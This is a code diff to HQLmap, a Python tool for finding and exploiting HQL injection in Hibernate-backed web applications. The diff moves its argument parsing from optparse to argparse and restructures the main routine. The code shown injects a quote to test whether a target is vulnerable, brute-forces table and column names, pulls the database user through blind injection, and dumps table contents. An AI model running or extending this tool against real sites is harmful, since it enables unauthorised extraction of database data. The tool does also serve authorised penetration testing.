@@ -1,5 +1,6 @@
+#!/usr/bin/env python
 import urllib
-import optparse
+from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
 import requests
 import sys
 import re
@@ -81,15 +82,16 @@ def table_exists(message):
         return True
 
 
-def check_if_host_vulnerable(url, param_to_test):
+def check_if_host_vulnerable():
 
+    print 'Checking if %s is vulnerable' % url
     params_copy = set_payload_in_param("'")
 
     req = send_HTTP_request(url, params_copy)
     if ('org.hibernate.QueryException' in req.content):
         print "Host seems vulnerable."
     else:
-        raise Exception('No Query Exception in the HTTP response.')
+        print 'No Query Exception in the HTTP response.'
 
 
 def set_payload_in_param(payload):
@@ -367,149 +369,148 @@ def get_result_from_dump(content):
 
 
 # option parser
-parser = optparse.OptionParser()
-parser.add_option('--url', help='qURL to pentest', dest='url')
-parser.add_option('--cookie', help='Cookie to test it', dest='cookie', default="")
-parser.add_option('--user_agent', help='Set the user agent', dest='user_agent', default="HQLmap v0.1")
-parser.add_option('--referer', help='Set the referer', dest='referer', default="")
-parser.add_option('--param', help='Param to test', dest='param')
-parser.add_option('--postdata', help='Postdata (POST Method)', dest='postdata', default=None)
-parser.add_option('--message', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)
+usage = """HQLmap: args"""
+parser = ArgumentParser(usage)
+parser.add_argument('-u','--url', help='qURL to pentest', dest='url',required=True)
+parser.add_argument('--cookie', help='Cookie to test it', dest='cookie', default="")
+parser.add_argument('--user_agent', help='Set the user agent', dest='user_agent', default="HQLmap v0.1")
+parser.add_argument('--referer', help='Set the referer', dest='referer', default="")
+parser.add_argument('-p','--param', help='Param to test', dest='param', required=True)
+parser.add_argument('--data','--postdata', help='Postdata (POST Method)', dest='postdata', default=None)
+parser.add_argument('--message', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)
 
 # Table options
-parser.add_option('--tables', help='Tries to gather as much tables as possible (With Bruteforce)', dest='tables', default=False, action='store_true')
-parser.add_option('--T', help='Name of the table you want to get', dest='table', default=None)
-parser.add_option('--table_name_file', help='DB file for name of tables', dest='file_table', default='db/tables.db')
+parser.add_argument('--tables', help='Tries to gather as much tables as possible (With Bruteforce)', dest='tables', default=False, action='store_true')
+parser.add_argument('--T', help='Name of the table you want to get', dest='table', default=None)
+parser.add_argument('--table_name_file', help='DB file for name of tables', dest='file_table', default='db/tables.db')
 
 # Column options
-parser.add_option('--columns', help='Tries to gather as much columns as possible (With Bruteforce)', dest='columns', default=False, action='store_true')
-parser.add_option('--C', help='Name of the column you want to get', dest='column', default=None)
-parser.add_option('--column_name_file', help='DB file for name of columns', dest='file_column', default='db/columns.db')
+parser.add_argument('--columns', help='Tries to gather as much columns as possible (With Bruteforce)', dest='columns', default=False, action='store_true')
+parser.add_argument('--C', help='Name of the column you want to get', dest='column', default=None)
+parser.add_argument('--column_name_file', help='DB file for name of columns', dest='file_column', default='db/columns.db')
 
 # Fingerprinting flag
-parser.add_option('--check', help='Check if host is vulnerable', dest='check', default=False, action='store_true')
-parser.add_option('--user', help='Tries to get user() from dbms', dest='user', default=False, action='store_true')
-parser.add_option('--count', help='Get count of specified table(s)', dest='count', default=False, action='store_true')
+parser.add_argument('-c','--check', help='Check if host is vulnerable', dest='check', default=False, action='store_true')
+parser.add_argument('--user', help='Tries to get user() from dbms', dest='user', default=False, action='store_true')
+parser.add_argument('--count', help='Get count of specified table(s)', dest='count', default=False, action='store_true')
 
 # Exploitation flag
-parser.add_option('--dump', help='Dump specified table(s) / column(s)', dest='dump', default=False, action='store_true')
+parser.add_argument('--dump', help='Dump specified table(s) / column(s)', dest='dump', default=False, action='store_true')
 
 # Results options
-parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
-parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')
+parser.add_argument('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
+parser.add_argument('-v','--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')
 
-if (len(sys.argv) <= 2):
-    parser.print_help()
+opts = parser.parse_args(sys.argv[1:])
+# Setting cookie and verbose mode
+COOKIE = opts.cookie
+VERBOSE_MODE = opts.verbose
+USER_AGENT = opts.user_agent
+REFERER = opts.referer
+PARAM_TO_TEST = opts.param
+URL = opts.url
+
+# check for GET params
+try:
+    PARAMS = opts.url.split('?')[1]
+    PARAMS = extract_params(PARAMS)
+    display_message("GET parameters are present. %s" % PARAMS)
+except:
+    display_message("No GET Parameters")
+    pass
+
+# check for POST PARAMS
+PARAMS['postdata'] = ''
+if (opts.postdata is not None):
+    PARAMS['postdata'] = extract_params(opts.postdata)
+    display_message("POST parameters are present. %s" % PARAMS['postdata'])
 else:
-    (opts, args) = parser.parse_args()
-    # Setting cookie and verbose mode
-    COOKIE = opts.cookie
-    VERBOSE_MODE = opts.verbose
-    USER_AGENT = opts.user_agent
-    REFERER = opts.referer
-    PARAM_TO_TEST = opts.param
-    URL = opts.url
+    # if no POST delete the entry
+    display_message("No POST parameters.")
+    del PARAMS['postdata']
 
-    # check for GET params
-    try:
-        PARAMS = opts.url.split('?')[1]
-        PARAMS = extract_params(PARAMS)
-        display_message("GET parameters are present. %s" % PARAMS)
-    except:
-        display_message("No GET Parameters")
-        pass
+if (opts.param not in PARAMS and ('postdata' in PARAMS and opts.param not in PARAMS['postdata'])):
+    raise Exception('Param "%s" is not present in the request!' % opts.param)
 
-    # check for POST PARAMS
-    PARAMS['postdata'] = None
-    if (opts.postdata is not None):
-        PARAMS['postdata'] = extract_params(opts.postdata)
-        display_message("POST parameters are present. %s" % PARAMS['postdata'])
-    else:
-        # if no POST delete the entry
-        display_message("No POST parameters.")
-        del PARAMS['postdata']
+url = opts.url.split('?')[0]
 
-    if (opts.param not in PARAMS and opts.param not in PARAMS['postdata']):
-        raise Exception('Param "%s" is not present in the request!' % opts.param)
+# --check flag
+if (opts.check):
+    check_if_host_vulnerable()
+    sys.exit(0)
 
-    url = opts.url.split('?')[0]
+# --tables flag
+if (opts.tables):
+    display_message("Trying to gather as much tables..")
+    find_tables(opts.file_table)
 
-    # --check flag
-    if (opts.check):
-        check_if_host_vulnerable()
+# -T=<name> flag
+if (opts.table):
+    display_message("Checking if " + opts.table + " exists.")
+    find_table(opts.table)
 
-    # --tables flag
+# --columns flag
+if (opts.columns):
     if (opts.tables):
-        display_message("Trying to gather as much tables..")
-        find_tables(opts.file_table)
+        display_message("Trying to find columns for all tables")
+        find_columns(opts.file_column)
+    elif(opts.table is not None):
+        display_message("Trying to find columns for table " + opts.table)
+        find_columns(opts.file_column, opts.table)
+    else:
+        print "ERROR : No table flag specified. "
 
-    # -T=<name> flag
-    if (opts.table):
-        display_message("Checking if " + opts.table + " exists.")
-        find_table(opts.table)
+# -C=<name> flag
+if (opts.column):
+    if (opts.tables):
+        display_message("Trying to find column " + opts.column + " for all tables")
+        for table in TABLES:
+            find_column(table, opts.column)
+    elif(opts.table is not None):
+        display_message("Trying to find column " + opts.column + " for table " + opts.table)
+        find_column(opts.table, opts.column)
+    else:
+        print "ERROR : No table flag specified. "
 
-    # --columns flag
+# --user flag
+if (opts.user):
+    if (not opts.blind_hqli_message):
+        raise Exception('You should specify a message')
+    get_dbms_username(opts.blind_hqli_message)
+
+# --count flag
+if (opts.count):
+    if (not opts.blind_hqli_message):
+        raise Exception('You should specify a message')
+    if (opts.tables):
+        get_count_of_table(opts.blind_hqli_message)
+    elif(opts.table is not None):
+        get_count_of_table(opts.blind_hqli_message, opts.table)
+    else:
+        print "ERROR : No table flag specified. "
+
+# --dump flag
+if (opts.dump):
     if (opts.columns):
-        if (opts.tables):
-            display_message("Trying to find columns for all tables")
-            find_columns(opts.file_column)
-        elif(opts.table is not None):
-            display_message("Trying to find columns for table " + opts.table)
-            find_columns(opts.file_column, opts.table)
-        else:
-            print "ERROR : No table flag specified. "
-
-    # -C=<name> flag
-    if (opts.column):
-        if (opts.tables):
-            display_message("Trying to find column " + opts.column + " for all tables")
-            for table in TABLES:
-                find_column(table, opts.column)
-        elif(opts.table is not None):
-            display_message("Trying to find column " + opts.column + " for table " + opts.table)
-            find_column(opts.table, opts.column)
-        else:
-            print "ERROR : No table flag specified. "
-
-    # --user flag
-    if (opts.user):
-        if (not opts.blind_hqli_message):
-            raise Exception('You should specify a message')
-        get_dbms_username(opts.blind_hqli_message)
-
-    # --count flag
-    if (opts.count):
-        if (not opts.blind_hqli_message):
-            raise Exception('You should specify a message')
-        if (opts.tables):
-            get_count_of_table(opts.blind_hqli_message)
-        elif(opts.table is not None):
-            get_count_of_table(opts.blind_hqli_message, opts.table)
-        else:
-            print "ERROR : No table flag specified. "
-
-    # --dump flag
-    if (opts.dump):
-        if (opts.columns):
-            # list columns as well
-            list_columns(url, opts.param)
-        if (opts.tables):
-            for table in TABLES:
-                if (opts.columns):
-                    for column in TABLES[table]:
-                        dump_table_by_column(table, column)
-                elif(opts.column is not None):
-                    dump_table_by_column(table, opts.column)
-
-        if (opts.table):
-            if (opts.columns):
-                for column in TABLES[opts.table]:
-                    dump_table_by_column(opts.table, column)
-            elif(opts.column is not None):
-                dump_table_by_column(opts.table, opts.column)
-
-    # enumerate tables and columns found if flag passed
-    if (opts.results):
-        # list columns
+        # list columns as well
         list_columns(url, opts.param)
-        enumerate_tables_and_columns()
+    if (opts.tables):
+        for table in TABLES:
+            if (opts.columns):
+                for column in TABLES[table]:
+                    dump_table_by_column(table, column)
+            elif(opts.column is not None):
+                dump_table_by_column(table, opts.column)
+
+    if (opts.table):
+        if (opts.columns):
+            for column in TABLES[opts.table]:
+                dump_table_by_column(opts.table, column)
+        elif(opts.column is not None):
+            dump_table_by_column(opts.table, opts.column)
+
+# enumerate tables and columns found if flag passed
+if (opts.results):
+    # list columns
+    list_columns(url, opts.param)
+    enumerate_tables_and_columns()
